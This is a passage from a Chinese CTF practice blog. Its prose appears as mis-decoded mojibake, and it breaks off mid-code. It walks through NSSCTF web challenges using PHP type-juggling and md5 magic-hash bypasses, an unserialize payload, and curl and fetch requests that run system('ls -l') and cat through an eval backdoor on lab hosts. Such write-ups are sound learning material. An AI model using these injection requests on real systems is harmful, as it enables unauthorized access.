<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <title>ç™½ç™½æ¯›æ¯›</title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/_custom.css">
<meta name="generator" content="Hexo 8.1.1"></head>
<body class="bg-post">

<div class="sidebar">
    <div class="header-info">
        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
        <div class="site-author">ç™½ç™½æ¯›æ¯›</div>
    </div>
    <nav class="nav">
        <a href="/">é¦–é¡µ</a>
        <a href="/categories">åˆ†ç±»</a>
        <a href="/archives">æ‰€æœ‰</a>
    </nav>
    <div class="contact-section">
        <p>If you want find me:</p>
        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
    </div>
</div>

<div class="content-area">
    
<div style="height: 60px;"></div>
<div class="content-wrapper">
    <article class="post-article">
        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">nssctfå­¦ä¹ ä¸­</h1>
        
        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
            <span>ğŸ“… å‘å¸ƒ: 2025-11-11</span>
            <span style="margin: 0 15px;">|</span>
            <span style="color: #007bff; font-weight: bold;">ğŸ“ æ›´æ–°: 2025-12-29</span>
            
            
             <span style="margin: 0 15px;">|</span>
             ğŸ“‚ åˆ·é¢˜
            
        </div>
        
        <div class="article-content">
            <p>è¿™æ˜¯ä¸€ä¸ªåŸºäºnssctfåšé¢˜çš„wpï¼Œæœ¬äººçº¯æ–°æ‰‹ã€‚<br>åšé¢˜æ²¡æœ‰é¡ºåºï¼ŒåŸºæœ¬æ˜¯çœ‹æˆ‘è‡ªå·±å†™å“ªä¸€é¢˜ï¼Œå°±å†™è¿™é¢˜çš„wpï¼Œä¸åˆ†éš¾åº¦çš„ã€‚</p>
<h1 id="1-NSSCTF-2022-Spring-Recruit-babyphp"><a href="#1-NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="#1.[NSSCTF 2022 Spring Recruit]babyphp"></a>#1.[NSSCTF 2022 Spring Recruit]babyphp</h1><p>é¢˜ç›®å†…å®¹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">\&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;</span><br><span class="line">    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br><span class="line">            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;yee&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;nop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;go on&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;let&#x27;s get some php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; let&#x27;s get some php_</span><br></pre></td></tr></table></figure>



<p>åˆ†æä»£ç <br>é¦–å…ˆï¼Œ<code>isset($_POST[&#39;a&#39;]) &amp;&amp; !preg_match(&#39;/[0-9]/&#39;, $_POST[&#39;a&#39;]) &amp;&amp; intval($_POST[&#39;a&#39;])</code><br>å­˜åœ¨aï¼Œaä¸å«0-9çš„æ•°å­—ï¼Œintval($_POST[â€˜aâ€™]) å¿…é¡»ä¸ºçœŸ<br>æŸ¥è¯¢ä»£ç ï¼Œintval() åœ¨è½¬æ¢æ—¶ä¼šå°è¯•ä»å­—ç¬¦ä¸²å¼€å¤´æå–æ•°å­—ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦ã€‚<br>preg_match æ˜¯ PHP ä¸­ç”¨äºæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å‡½æ•°ã€‚<br>æ‰€æœ‰aå¯ä»¥ç”¨æ•°ç»„a[]&#x3D;1<br>è¿™æ ·å‡æ»¡è¶³ æ‰€æœ‰æ¡ä»¶<br>ç¬¬äºŒï¼Œisset($_POST[â€˜b1â€™]) &amp;&amp; $_POST[â€˜b2â€™]<br>b1ï¼Œb2æœ‰å€¼ä¸”éç©ºï¼Œç„¶åæ¯”è¾ƒmd5<br>åŒæ ·æ•°ç»„ï¼ŒMD5è¿”å›null<br>b1[]&#x3D;2,b2[]&#x3D;3<br>æœ€åï¼Œ<code>$_POST[&#39;c1&#39;] != $_POST[&#39;c2&#39;] &amp;&amp; is_string($_POST[&#39;c1&#39;]) &amp;&amp; is_string($_POST[&#39;c2&#39;]) &amp;&amp; md5($_POST[&#39;c1&#39;]) == md5($_POST[&#39;c2&#39;])</code><br>c1ä¸c2å‡ä¸ºå­—ç¬¦ä¸²ï¼Œä¸”ä¸åŒï¼Œåˆæ¯”è¾ƒmd5è¿˜æ˜¯è‹¥æ¯”è¾ƒï¼Œä¸Šç½‘éšä¾¿æŸ¥ä¸€ä¸‹ï¼Œç”¨ç§‘å­¦è®¡æ•°æ³•MD5ï¼Œ0eè¢«å½“æˆ0ï¼Œéšä¾¿æ‰¾md5ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚<br>æ‰€ä»¥ C:\Users\G1731&gt;curl -X POST -d â€œa[]&#x3D;1&amp;b1[]&#x3D;1&amp;b2[]&#x3D;2&amp;c1&#x3D;240610708&amp;c2&#x3D;QNKCDZOâ€ <a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28382/">http://node4.anna.nssctf.cn:28382/</a><br>ç”¨curlæ‰§è¡Œpostï¼Œ<br>å¾—åˆ°flagï¼ŒNSSCTF{2fd7b1ec-41c5-4895-a5d3-bc56cb172231}</p>
<hr>
<h1 id="2-HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#2-HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="#2.[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>#2.[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>getä¼ å‚ï¼Œåˆ†æä¸€ä¸‹ä»£ç <br>$username &#x3D; â€œthis_is_secretâ€;<br>$password &#x3D; â€œthis_is_not_known_to_youâ€;<br>å®šä¹‰è´¦å·ï¼Œå¯†ç ï¼Œç„¶ååˆhere I changed those two ï¼Œé‚£ç›´æ¥å°±è¿›å…¥çŒœæµ‹é˜¶æ®µäº†ï¼Œå› ä¸ºè¿™ç”¨æˆ·åå’Œå¯†ç è¦æ˜¯æœ‰å…·ä½“å€¼ï¼Œé‚£ä¸ç»™å…¶ä»–æç¤ºå°±æ˜¯çŒœäº†ï¼ŒåˆåŠ ä¸Šè¿™æ˜¯æ–°ç”Ÿèµ›çš„é¢˜ï¼Œåˆæ­¥çŒœæµ‹æ˜¯ç©ºçš„å§ã€‚<br>$data_unserialize &#x3D; unserialize($_GET[â€˜infoâ€™]);<br>ååºåˆ—åŒ–ï¼Œå»æŸ¥ä¸€ä¸‹ä½œç”¨ï¼Œunserialize() å‡½æ•°ä¼šå°†ç”¨æˆ·é€šè¿‡ GET å‚æ•° info ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œè¿˜åŸä¸º PHP ä¸­çš„å˜é‡ã€‚<br>if ($data_unserialize[â€˜usernameâ€™]&#x3D;&#x3D;$username&amp;&amp;$data_unserialize[â€˜passwordâ€™]&#x3D;&#x3D;$password){<br>    echo $flag;<br>}else{<br>    echo â€œusername or password error!â€;<br>è¿™ä¸€æ®µè¦æ±‚å¼±æ¯”è¾ƒæˆ‘ä»¬ä¼ å…¥çš„æ˜¯å¦ä¸æœåŠ¡å™¨ç›¸ç­‰ã€‚<br>å¤§æŠµæ€è·¯å°±è¿™æ ·äº†ï¼Œååºåˆ—åŒ–æˆ‘ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ‰€ä»¥é—®äº†ä¸€ä¸‹ai</p>
<p>ä¸€ã€å…ˆæ˜ç¡®åºåˆ—åŒ–å­—ç¬¦ä¸²çš„é€šç”¨æ ¼å¼ï¼ˆæ•°ç»„ç±»å‹ï¼‰<br>PHP ä¸­æ•°ç»„åºåˆ—åŒ–åçš„æ ¼å¼æ˜¯ï¼ša:æ•°ç»„é•¿åº¦:{é”®1çš„ç±»å‹:é”®1é•¿åº¦:â€é”®1å€¼â€;å€¼1çš„ç±»å‹:å€¼1é•¿åº¦:å€¼1å†…å®¹;é”®2çš„ç±»å‹:é”®2é•¿åº¦:â€é”®2å€¼â€;å€¼2çš„ç±»å‹:å€¼2é•¿åº¦:å€¼2å†…å®¹;}<br>aï¼šè¡¨ç¤ºå˜é‡ç±»å‹æ˜¯ arrayï¼ˆæ•°ç»„ï¼‰<br>iï¼šè¡¨ç¤ºå˜é‡ç±»å‹æ˜¯ integerï¼ˆæ•´æ•°ï¼‰<br>sï¼šè¡¨ç¤ºå˜é‡ç±»å‹æ˜¯ stringï¼ˆå­—ç¬¦ä¸²ï¼‰<br>å†’å·åçš„æ•°å­—ï¼šè¡¨ç¤º â€œé•¿åº¦â€ï¼ˆæ•°ç»„é•¿åº¦ &#x2F; å­—ç¬¦ä¸²é•¿åº¦ï¼Œæ•´æ•°æ— é•¿åº¦å±æ€§ï¼‰<br>ä»”ç»†çœ‹çœ‹åï¼Œæˆ‘ä»¬å°±èƒ½æ¨å‡ºæˆ‘ä»¬è¦ä¼ å‚çš„å€¼äº†ï¼Œinfo&#x3D;a:2:{s:8:â€usernameâ€;i:0;s:8:â€passwordâ€;i:0;}<br><a target="_blank" rel="noopener" href="http://node5.anna.nssctf.cn:26551/?info=a:2:%7Bs:8:%22username%22;i:0;s:8:%22password%22;i:0;%7D">http://node5.anna.nssctf.cn:26551/?info=a:2:{s:8:%22username%22;i:0;s:8:%22password%22;i:0;}</a><br>æ‹¿ä¸‹flag<br>NSSCTF{ecd62ebd-98ea-4a71-aded-efab0995f71d}<br>ä¹Ÿæ˜¯è¿æ°”å¥½ä¸€ç‚¹ï¼Œå¼±æ¯”è¾ƒæˆç«‹äº†ï¼Œä¸ç„¶åˆè¦å¡ä¸€ä¼šäº†ã€‚</p>
<hr>
<h1 id="3-ç¾ŠåŸæ¯-2020-easycon"><a href="#3-ç¾ŠåŸæ¯-2020-easycon" class="headerlink" title="#3.[ç¾ŠåŸæ¯ 2020]easycon"></a>#3.[ç¾ŠåŸæ¯ 2020]easycon</h1><p><a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28048/%EF%BC%8C%E7%BB%99%E4%BA%86%E4%B8%AA%E9%9D%B6%E6%9C%BA%E7%82%B9%E8%BF%9B%E5%8E%BB%E4%B8%80%E7%9C%8B">http://node4.anna.nssctf.cn:28048/ï¼Œç»™äº†ä¸ªé¶æœºç‚¹è¿›å»ä¸€çœ‹</a><br><img src="/images/QQ20251114-185817.png" alt="alt text"><br>çœ‹åˆ°è¿™ä¸ªï¼Œæˆ‘è¿˜ä»¥ä¸ºæˆ‘å¼€é”™ç½‘ç«™ï¼Œçœ‹å¾—è·Ÿä»€ä¹ˆè½¯ä»¶çš„å®˜æ–¹ç½‘ç«™ä¸€æ ·ï¼Œç¡®è®¤å‡ æ¬¡åï¼Œæ‰è‚¯å®šè¿™æ˜¯æˆ‘ä»¬é¢˜ç›®çš„ç½‘ç«™ï¼Œå—¯ï¼Œæ²¡ä»€ä¹ˆå…·ä½“çš„æ€è·¯ï¼Œæ‰«ä¸€æ‰«</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å¼€å§‹æ‰«æ......</span><br><span class="line">http://node4.anna.nssctf.cn:28048/index.php</span><br><span class="line">http://node4.anna.nssctf.cn:28048/.htaccess-local</span><br><span class="line">http://node4.anna.nssctf.cn:28048/.htaccess.txt</span><br><span class="line">http://node4.anna.nssctf.cn:28048/.htaccess/</span><br><span class="line">http://node4.anna.nssctf.cn:28048/.htaccess.BAK</span><br></pre></td></tr></table></figure>
<p>æ²¡ä»€ä¹ˆç‰¹åˆ«æ˜æ˜¾çš„ä¸œè¥¿ï¼Œçœ‹ä¸€ä¸‹robot</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28048/robots.txt</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at node4.anna.nssctf.cn Port 28048&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>404éƒ½æ¥äº†ï¼Œçœ‹æ¥ç›®å‰æ˜¯å½»åº•æ²¡å¤´ç»ªäº†ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è®¿é—®æºç <br>C:\Users\G1731&gt;curl <a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28048/index.php">http://node4.anna.nssctf.cn:28048/index.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">     &lt;style&gt; div.main &#123; margin-left:auto; margin-right:auto;  &#125; body &#123; background-color:        #FAEBA7; &#125;&lt;/style&gt;</span><br><span class="line">     &lt;title&gt;</span><br><span class="line">       welcome to YCBCTF</span><br><span class="line">     &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=gw2.jpg  width=49% height=60%&gt;</span><br><span class="line">    &lt;img src=gw.jpg  width=49% height=60%&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&#x27;eval post cmd&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è®¿é—®ç½‘ç«™æ˜¯åŠ è½½ä¸å‡ºæ¥çš„ï¼Œæˆ‘ç”¨curlæ‰æœ‰å›åº”ï¼Œè¿™ä¸ªä»£ç å‘Šè¯‰æˆ‘ä»¬é€šè¿‡POSTè¯·æ±‚æäº¤cmdï¼Œåˆ©ç”¨evalæ‰§è¡Œå‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å°±è¯•ä¸€è¯•æˆ‘çš„å¸¸ç”¨ä¸¤ä»¶å¥—ï¼Œls -laä¸cat</p>
<figure class="highlight plaintext"><figcaption><span>-X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cmd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">     &lt;style&gt; div.main &#123; margin-left:auto; margin-right:auto;  &#125; body &#123; background-color:        #FAEBA7; &#125;&lt;/style&gt;</span><br><span class="line">     &lt;title&gt;</span><br><span class="line">       welcome to YCBCTF</span><br><span class="line">     &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=gw2.jpg  width=49% height=60%&gt;</span><br><span class="line">    &lt;img src=gw.jpg  width=49% height=60%&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&#x27;eval post cmd&#x27;)&lt;/script&gt;total 64</span><br><span class="line">drwxr-xr-x    1 root root 4096 Nov 14 09:52 .</span><br><span class="line">drwxr-xr-x    1 root root 4096 Nov 14 09:52 ..</span><br><span class="line">-rwxr-xr-x    1 root root    0 Nov 14 09:52 .dockerenv</span><br><span class="line">lrwxrwxrwx    1 root root    7 Oct  6  2021 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x    2 root root 4096 Apr 15  2020 boot</span><br><span class="line">drwxr-xr-x    5 root root  340 Nov 14 09:52 dev</span><br><span class="line">drwxr-xr-x    1 root root 4096 Nov 14 09:52 etc</span><br><span class="line">drwxr-xr-x    2 root root 4096 Apr 15  2020 home</span><br><span class="line">lrwxrwxrwx    1 root root    7 Oct  6  2021 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx    1 root root    9 Oct  6  2021 lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx    1 root root    9 Oct  6  2021 lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx    1 root root   10 Oct  6  2021 libx32 -&gt; usr/libx32</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct  6  2021 media</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct  6  2021 mnt</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct  6  2021 opt</span><br><span class="line">dr-xr-xr-x 1082 root root    0 Nov 14 09:52 proc</span><br><span class="line">drwx------    2 root root 4096 Oct  6  2021 root</span><br><span class="line">drwxr-xr-x    1 root root 4096 Jan 19  2022 run</span><br><span class="line">lrwxrwxrwx    1 root root    8 Oct  6  2021 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct  6  2021 srv</span><br><span class="line">dr-xr-xr-x   13 root root    0 Nov 14 09:52 sys</span><br><span class="line">drwxrwxrwt    1 root root 4096 Nov 14 09:52 tmp</span><br><span class="line">drwxr-xr-x    1 root root 4096 Oct  6  2021 usr</span><br><span class="line">drwxr-xr-x    1 root root 4096 Jan 19  2022 var</span><br></pre></td></tr></table></figure>
<p>æˆ‘é ï¼Œå±…ç„¶æ²¡çœ‹è§flagç›¸å…³çš„æ–‡ä»¶ï¼Œé‚£çŒ«çŒ«å­¦é•¿æš‚æ—¶ä¸èƒ½å‡ºå‡»äº†ï¼Œå†çœ‹çœ‹ç½‘ç«™ç›®å½•æœ‰æ²¡æœ‰</p>
<figure class="highlight plaintext"><figcaption><span>&#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;,</span><br><span class="line">    body: &#x27;cmd=system(&quot;ls -l&quot;);&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">.then(r =&gt; r.text())</span><br><span class="line">.then(data =&gt; console.log(data))</span><br><span class="line">.catch(error =&gt; console.error(&#x27;Error:&#x27;, error));</span><br><span class="line">PromiseÂ &#123;&lt;pending&gt;&#125;</span><br><span class="line">VM21:1 Fetch finished loading: POST &quot;http://node4.anna.nssctf.cn:28048/index.php&quot;.</span><br><span class="line">(anonymous) @ VM21:1</span><br><span class="line">VM21:7 </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">     &lt;style&gt; div.main &#123; margin-left:auto; margin-right:auto;  &#125; body &#123; background-color: 	#FAEBA7; &#125;&lt;/style&gt;</span><br><span class="line">     &lt;title&gt;</span><br><span class="line">       welcome to YCBCTF</span><br><span class="line">     &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=gw2.jpg  width=49% height=60%&gt;</span><br><span class="line">    &lt;img src=gw.jpg  width=49% height=60%&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&#x27;eval post cmd&#x27;)&lt;/script&gt;total 220</span><br><span class="line">-rwxrwxrwx 1 root root 129904 Aug 29  2020 bbbbbbbbb.txt</span><br><span class="line">-rwxrwxrwx 1 root root  49898 Aug 29  2020 gw.jpg</span><br><span class="line">-rwxrwxrwx 1 root root  22308 Aug 29  2020 gw2.jpg</span><br><span class="line">-rwxrwxrwx 1 root root  10918 Jan 19  2022 index.html</span><br><span class="line">-rwxrwxrwx 1 root root    394 Aug 29  2020 index.php</span><br></pre></td></tr></table></figure>
<p>å…¶å®æœ¬æ¥æƒ³ç”¨curlçš„ï¼Œä½†æ˜¯ä¸€ç›´æ˜¾ç¤ºæ²¡è¿æ¥ä¸ŠæœåŠ¡å™¨ï¼Œåªèƒ½è¯•ä¸€è¯•JavaScriptäº†ï¼Œä¸è¿‡è¿˜å¥½æˆåŠŸäº†ï¼Œè¿™é‡Œé¢è¿”å›äº†ä¸€ä¸ªå·¨å¯ç–‘çš„æ–‡ä»¶ï¼Œbbbbbbbbb.txtï¼Œå°±æ˜¯å®ƒï¼Œæ‹¿ä¸‹</p>
<figure class="highlight plaintext"><figcaption><span>&#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;,</span><br><span class="line">    body: &#x27;cmd=system(&quot;cat bbbbbbbbb.txt&quot;);&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">.then(r =&gt; r.text())</span><br><span class="line">.then(data =&gt; console.log(data))</span><br><span class="line">.catch(error =&gt; console.error(&#x27;Error:&#x27;, error));</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œè¯¥poståï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸²ç‰¹åˆ«ç‰¹åˆ«é•¿çš„base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYJ..........................................</span><br></pre></td></tr></table></figure>
<p>å¾ˆé•¿å¾ˆé•¿ï¼Œæˆ‘å°±ä¸è´´å‡ºæ¥äº†ï¼Œæˆ‘æ”¾å‡ºæ¥çš„ä¸è¶³åƒåˆ†ä¹‹ä¸€ï¼Œç¨å¾®ç ”ç©¶äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™æ˜¯å›¾ç‰‡base64è§£ç çš„ç»“æœï¼Œæˆ‘ä»¬æ‰”ç»™éšæ³¢é€æµï¼Œè®©å®ƒè§£ç ä¸€ä¸‹ï¼Œæœ€åå¾—åˆ°è¿™ä¹ˆä¸€å¼ å›¾ç‰‡<br><img src="/images/image_1.jpg" alt="alt text"><br>è¿™å›¾ç‰‡ä¸Šæ˜¯ä»€ä¹ˆäººæˆ‘ä¸çŸ¥é“ï¼Œä½†flagæ¥äº†<br><strong>GWHT{do_u_kn0w_c@idao}</strong><br><strong>æ”¹æˆnssctfå½¢å¼ï¼ŒNSSCTF{do_u_kn0w_c@idao}</strong></p>
<hr>
<h1 id="4-GDOUCTF-2023-å—ä¸äº†ä¸€ç‚¹"><a href="#4-GDOUCTF-2023-å—ä¸äº†ä¸€ç‚¹" class="headerlink" title="#4.[GDOUCTF 2023]å—ä¸äº†ä¸€ç‚¹"></a>#4.[GDOUCTF 2023]å—ä¸äº†ä¸€ç‚¹</h1><p>ç»™äº†ä¸€ä¸ªé¶æœºï¼Œç‚¹å¼€çœ‹ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 